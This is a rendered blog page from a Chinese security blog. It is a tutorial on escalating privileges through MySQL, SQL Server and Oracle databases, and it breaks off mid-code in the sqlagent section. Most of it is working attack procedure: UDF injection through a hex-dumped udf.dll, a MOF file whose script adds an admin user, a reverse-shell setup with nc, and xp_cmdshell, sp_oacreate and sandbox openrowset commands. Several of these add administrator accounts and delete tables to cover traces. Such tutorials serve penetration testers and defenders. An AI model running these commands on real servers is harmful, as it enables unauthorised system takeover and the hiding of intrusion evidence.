@@ -1,0 +1,910 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#8c9ae6">
+  <meta name="author" content="HackerTerry">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="MySQL数据库提权提权方式 udf提权 mof提权 启动项提权 反弹shell提权  udf提权User Defined Functions，简称UDF，通俗来讲就是用户可自定义函数。udf提权就是利用到创建自定义函数（sys_eval），在mysql中调用这个自定义的函数（sys_eval）来实现获取对方主机的system的shell权限，从而达到提权的目的。 简单来说便是利用提权脚本放到对方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库提权">
+<meta property="og:url" content="https://rookieterry.github.io/2021/10/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html">
+<meta property="og:site_name" content="HackerTerry&#39;s Blog">
+<meta property="og:description" content="MySQL数据库提权提权方式 udf提权 mof提权 启动项提权 反弹shell提权  udf提权User Defined Functions，简称UDF，通俗来讲就是用户可自定义函数。udf提权就是利用到创建自定义函数（sys_eval），在mysql中调用这个自定义的函数（sys_eval）来实现获取对方主机的system的shell权限，从而达到提权的目的。 简单来说便是利用提权脚本放到对方">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/09/16/mIaPk8zxe56J1gn.png">
+<meta property="article:published_time" content="2021-10-27T19:53:10.000Z">
+<meta property="article:modified_time" content="2022-09-17T09:12:13.000Z">
+<meta property="article:author" content="HackerTerry">
+<meta property="article:tag" content="权限提升">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2022/09/16/mIaPk8zxe56J1gn.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>数据库提权 - HackerTerry&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rookieterry.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":"UA-241125581-1","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-241125581-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>HackerTerry&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/hacker.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="数据库提权"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        HackerTerry
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-10-27 20:53" pubdate>
+          星期三, 十月 27日 2021, 8:53 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          8.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          71 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">数据库提权</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h1><h2 id="提权方式"><a href="#提权方式" class="headerlink" title="提权方式"></a>提权方式</h2><ul>
+<li>udf提权</li>
+<li>mof提权</li>
+<li>启动项提权</li>
+<li>反弹shell提权</li>
+</ul>
+<h2 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h2><p>User Defined Functions，简称UDF，通俗来讲就是用户可自定义函数。udf提权就是利用到创建自定义函数（sys_eval），在mysql中调用这个自定义的函数（sys_eval）来实现获取对方主机的system的shell权限，从而达到提权的目的。 简单来说便是利用提权脚本放到对方mysql指定的目录下，运用脚本创建自定义函数，使用函数即可获取shell权限。 我们需要将udf.dll文件放入C:\phpStudy\MySQL\lib\plugin，前面路径可能跟我不一样，但是需要做的就是将dll文件放入\lib\plugin目录中。</p>
+<p>Mysql版本大于5.1版本：udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。 Mysql版本小于5.1版本： udf.dll文件在Windows2003下放置于c:\windows\system32， 在windows2000下放置于c:\winnt\system32。 如果目录不存在则利用NTFS数据流创建文件目录：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\lib::$INDEX_ALLOCATION&#x27;</span>; #利用NTFS ADS创建lib目录 <br><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;It is dll&#x27;</span> <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\lib\\plugin::$INDEX_ALLOCATION&#x27;</span>; #利用NTFS ADS创建plugin目录<br></code></pre></td></tr></table></figure>
+
+<h3 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h3><p>1）获取到对方mysql的shell，或者是获取到mysql账号密码，能够调用mysql语句</p>
+<p>2）对方mysql具有insert和delete权限，也就是可写可删除添加能够创建目录，写入文件</p>
+<p>3）对方mysql是root权限</p>
+<p>验证是否可写：<code>show global variables like &#39;secure%&#39;;</code></p>
+<p>secure_file_priv是限制函数在哪个目录下拥有上传或者读取文件的权限。如果secure_file_priv值为空则可写，为指定路径则是指定路径可写，需要全部可写需要在mysql.ini配置文件添加语句即可。</p>
+<h3 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h3><p>1.得到插件库路径：<code>show variables like &quot;%plugin%&quot;;</code></p>
+<p>2.找对应操作系统的udf库文件:Windows直接上传，Linux的sqlmap自带。对于Linux系统，先用<code>uname -a</code>查看操作系统位数，再查看动态库路径<code>/pentest/database/sqlmap/udf/mysql/linux/64</code>（假设64位系统），文件名是lib_mysqludf_sys.so</p>
+<p>3.放入文件：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> temp(data longblob); #以二进制数据流容器longblob创建临时data表<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> temp(data) <span class="hljs-keyword">values</span> (unhex(<span class="hljs-string">&#x27;udf文件的16进制格式&#x27;</span>)); #将udf.dll脚本的十六进制写入data表<br><span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> temp <span class="hljs-keyword">into</span> dumpfile &quot;xxx\\xxx\\lib\\plugin\\udf.dll&quot;; #将udf文件导入到指定目录<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>; #创建自定义函数sys_eval<br></code></pre></td></tr></table></figure>
+
+<p>注意，Linux系统可能要加读写权限：<code>chmod 777 /usr/lib/mysql/plugin</code></p>
+<p>查看udf库支持的函数（Linux）：<code>nm -D /usr/lib/mysql/plugin/mysqludf.so</code></p>
+<p>4.验证提权是否成功：<code>select sys_eval(&#39;命令&#39;)</code></p>
+<h3 id="提权常用SQL语句"><a href="#提权常用SQL语句" class="headerlink" title="提权常用SQL语句"></a>提权常用SQL语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> cmdshell(‘net <span class="hljs-keyword">user</span> hsy <span class="hljs-number">123456</span> <span class="hljs-operator">/</span><span class="hljs-keyword">add</span>’); #添加用户<br><span class="hljs-keyword">select</span> cmdshell(‘net localgroup administrators hsy <span class="hljs-operator">/</span><span class="hljs-keyword">add</span>’); #将用户加到管理组<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval; #删除函数<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> data; #为了删除痕迹，把刚刚新建的data表删掉<br></code></pre></td></tr></table></figure>
+
+<h2 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h2><p>利用了<code>C:\Windows\System32\wbem\MOF</code>目录下的<code>nullevt.mof</code>文件</p>
+<p>利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行。</p>
+<h3 id="提权条件-1"><a href="#提权条件-1" class="headerlink" title="提权条件"></a>提权条件</h3><ol>
+<li>只使用于windows系统，一般低版本系统才可以用，比如<code>xp</code>、<code>server2003</code>。</li>
+<li>对<code>C:\Windows\System32\wbem\MOF</code>目录有读写权限。</li>
+<li>可以找到一个可写目录，写入mof文件。</li>
+</ol>
+<h3 id="操作过程-1"><a href="#操作过程-1" class="headerlink" title="操作过程"></a>操作过程</h3><ol>
+<li>在可写目录中上传mof文件,例如把mof文件上传到<code>C:/wmpub/nullevt.mof</code>。</li>
+<li>把这个文件复制到<code>C:/Windows/System32/wbem/MOF/nullevt.mof</code>目录下：</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;C:/wmpub/nullevt.mof&#x27;</span>) <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;C:/Windows/System32/wbem/MOF/nullevt.mof&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>3.将下面这段代码复制到mof后缀的文件中：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs sql"># pragma namespace(&quot;\.\root\subscription&quot;)<br><br>instance <span class="hljs-keyword">of</span> EventFilter <span class="hljs-keyword">as</span> $EventFilter&#123; EventNamespace <span class="hljs-operator">=</span>&quot;Root\Cimv2&quot;; Name <span class="hljs-operator">=</span> &quot;filtP2&quot;; Query <span class="hljs-operator">=</span> &quot;Select * From InstanceModificationEvent &quot;<br><br>&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;<br><br>&quot;And TargetInstance.Second = 5&quot;;<br><br>QueryLanguage <span class="hljs-operator">=</span> &quot;WQL&quot;;<br><br>&#125;;<br><br>instance <span class="hljs-keyword">of</span> ActiveScriptEventConsumer <span class="hljs-keyword">as</span> $Consumer<br><br>&#123;<br><br>Name <span class="hljs-operator">=</span> &quot;consPCSV2&quot;;<br><br>ScriptingEngine <span class="hljs-operator">=</span> &quot;JScript&quot;;<br><br>ScriptText <span class="hljs-operator">=</span><br><br>&quot;var WSH = new<br><br>ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe <span class="hljs-keyword">user</span> admin admin <span class="hljs-operator">/</span><span class="hljs-keyword">add</span>&quot;)&quot;;<br><br>&#125;;<br><br>instance <span class="hljs-keyword">of</span> __FilterToConsumerBinding<br><br>&#123;<br><br>Consumer <span class="hljs-operator">=</span> $Consumer;<br><br><span class="hljs-keyword">Filter</span> <span class="hljs-operator">=</span> $EventFilter;<br><br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>把这个mof文件上传到目标机中，可以修改代码，进行命令执行。</p>
+<p>目前mof提权方法用的比较少，建议使用udf脚本进行MySQL数据库提权。</p>
+<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><p>利用MySQL，将后门写入开机启动项。同时因为是开机自启动，在写入之后，需要重启目标服务器，才可以运行。</p>
+<h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p>mysql创建反弹函数：<code>select backshell（’发送到的ip地址’,’端口’）</code>，kali使用nc监听本地（攻击机）IP：<code>nc -l（本地）-p 端口</code>。</p>
+<h1 id="SQL-Server和Oracle数据库提权"><a href="#SQL-Server和Oracle数据库提权" class="headerlink" title="SQL Server和Oracle数据库提权"></a>SQL Server和Oracle数据库提权</h1><h2 id="SQL-server数据库提权"><a href="#SQL-server数据库提权" class="headerlink" title="SQL server数据库提权"></a>SQL server数据库提权</h2><ul>
+<li>xp_cmd_shell提权（数据库权限要求是最高的SA权限）</li>
+<li>sp_oacreate提权</li>
+<li>沙盒提权</li>
+<li>sqlagent.exe提权（数据库权限不要求最高）</li>
+</ul>
+<h2 id="xp-cmd-shell提权"><a href="#xp-cmd-shell提权" class="headerlink" title="xp_cmd_shell提权"></a>xp_cmd_shell提权</h2><p>mssql2000中默认开启xp_cmd_shell，2005以后默认禁用。</p>
+<p>管理员 sysadmin(即sa)权限则可以用 sp_configure 重新开启它。</p>
+<p>启用：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">EXEC</span> sp_configure ‘<span class="hljs-keyword">show</span> advanced options’, <span class="hljs-number">1</span><br>RECONFIGURE;<br><span class="hljs-built_in">EXEC</span> sp_configure ‘xp_cmdshell’, <span class="hljs-number">1</span>;<br>RECONFIGURE;<br></code></pre></td></tr></table></figure>
+
+<p>关闭：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">exec</span> sp_configure ‘<span class="hljs-keyword">show</span> advanced options’, <span class="hljs-number">1</span>;<br>reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure ‘xp_cmdshell’, <span class="hljs-number">0</span>;<br>reconfigure;<br></code></pre></td></tr></table></figure>
+
+<p>执行：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">EXEC master<span class="hljs-selector-class">.dbo</span><span class="hljs-selector-class">.xp_cmdshell</span> ‘命令’<br></code></pre></td></tr></table></figure>
+
+<p>如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复<br><code>exec master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’</code></p>
+<h2 id="sp-oacreate提权"><a href="#sp-oacreate提权" class="headerlink" title="sp_oacreate提权"></a>sp_oacreate提权</h2><p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。</p>
+<p>启用：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure ‘<span class="hljs-keyword">show</span> advanced options’, <span class="hljs-number">1</span>;<br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;<br><span class="hljs-keyword">EXEC</span> sp_configure ‘Ole Automation Procedures’, <span class="hljs-number">1</span>;<br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;<br></code></pre></td></tr></table></figure>
+
+<p>关闭：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure ‘<span class="hljs-keyword">show</span> advanced options’, <span class="hljs-number">1</span>;<br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;<br><span class="hljs-keyword">EXEC</span> sp_configure ‘Ole Automation Procedures’, <span class="hljs-number">0</span>;<br>RECONFIGURE <span class="hljs-keyword">WITH</span> OVERRIDE;<br></code></pre></td></tr></table></figure>
+
+<p>执行：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">declare</span> <span class="hljs-title">@shell</span> int exec sp_oacreate ‘wscript.shell’<span class="hljs-punctuation">,</span><span class="hljs-title">@shell</span> output exec sp_oamethod<br><span class="hljs-title">@shell</span><span class="hljs-punctuation">,</span>’run’<span class="hljs-punctuation">,</span><span class="hljs-keyword">null</span><span class="hljs-punctuation">,</span>’<span class="hljs-keyword">c</span>:\windows\system<span class="hljs-number">32</span>\cmd.exe /<span class="hljs-keyword">c</span> whoami &gt;<span class="hljs-keyword">c</span>:\<span class="hljs-number">1</span>.txt’<br></code></pre></td></tr></table></figure>
+
+<h2 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h2><p>mssql自带沙盒，利用沙盒执行命令。<br>开启沙盒，使用沙盒执行命令：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">exec</span> sp_configure ‘<span class="hljs-keyword">show</span> advanced options’,<span class="hljs-number">1</span>;reconfigure; <span class="hljs-meta">#不开启的话在执行xp_regwrite 会提示让我们开启</span><br></code></pre></td></tr></table></figure>
+
+<p>关闭沙盒：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> sp_configure ‘Ad Hoc Distributed Queries’,1;reconfigure; <span class="hljs-comment">#如果一次执行全部代码有问题，先执行这句和上一句代码</span><br></code></pre></td></tr></table></figure>
+
+<p>查询是否正常关闭：</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-keyword">exec</span> master..xp_regwrite<br>‘<span class="hljs-params">HKEY_LOCAL_MACHINE</span>’,’SOFTWARE\Microsoft\Jet\<span class="hljs-number">4.0</span>\Engines’,’SandBoxMode’,’REG_DWORD’,<span class="hljs-number">0</span><span class="hljs-comment">;</span><br><span class="hljs-comment">#经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句</span><br></code></pre></td></tr></table></figure>
+
+<p>执行系统命令：</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-keyword">exec</span> master.dbo.xp_regread ‘<span class="hljs-params">HKEY_LOCAL_MACHINE</span>’,’SOFTWARE\Microsoft\Jet\<span class="hljs-number">4.0</span>\Engines’,<br>‘SandBoxMode’<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net user qianxun 123456 /add&quot;)&#x27;</span>)<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;net localgroup administrators qianxun /add&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>恢复配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCALMACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,1;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,0;reconfigure;<br><span class="hljs-built_in">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,0;reconfigure;<br></code></pre></td></tr></table></figure>
+
+<p><strong>沙盒模式SandBoxMode参数含义（默认是2）</strong></p>
+<p>0：在任何所有者中禁止启用安全模式</p>
+<p>1 ：为仅在允许范围内</p>
+<p>2 ：必须在access模式下</p>
+<p>3：完全开启</p>
+<h2 id="sqlagent-exe提权"><a href="#sqlagent-exe提权" class="headerlink" title="sqlagent.exe提权"></a>sqlagent.exe提权</h2><p>sqlagent.exe是微软Microsoft SQL Server精灵程序，用于计划任务。当服务器出现故障时，该程序可帮助恢复服务器上的数据，不过只有mssql才有这个程序。</p>
+<p>拿到webshell以后，我们先执行<code>tasklist /svc</code>命令，查看是否有sqlagent.exe进程在运行。如果有的话，直接用普通用户连接数据库，并执行以下SQL语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql">USE msdb<br><span class="hljs-keyword">EXEC</span> sp_add_job <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span>,<br><span class="hljs-variable">@enabled</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>,<br><span class="hljs-variable">@description</span> <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;This will give a low privileged user access to xp_cmdshell&#x27;</span>,<br><span class="hljs-variable">@delete</span>_level <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">EXEC</span> sp_add_jobstep <span class="hljs-variable">@job</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;GetSystemOnSQL&#x27;</span>,<br><span class="hljs-variable">@step</span>_name <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Exec my sql&#x27;</span>,<br><span class="hljs-variable">@subsystem</span> <span class="hljs-operator">=</span> <span 